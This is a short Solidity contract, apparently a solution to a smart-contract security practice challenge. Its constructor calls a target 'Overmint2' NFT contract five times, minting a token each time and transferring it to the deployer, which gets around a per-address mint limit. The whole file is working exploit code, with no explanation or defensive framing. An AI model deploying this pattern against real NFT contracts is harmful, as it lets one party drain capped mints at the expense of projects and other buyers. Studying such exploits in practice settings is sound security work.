// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import {Overmint2} from "./Overmint2.sol";

contract Overmint2Attacker {
    constructor(address _target) {
        Overmint2 target = Overmint2(_target);
        for (uint256 i = 0; i < 5; i++) {
            target.mint();
            uint256 tokenId = target.totalSupply();
            target.transferFrom(address(this), msg.sender, tokenId);
        }
    }
}
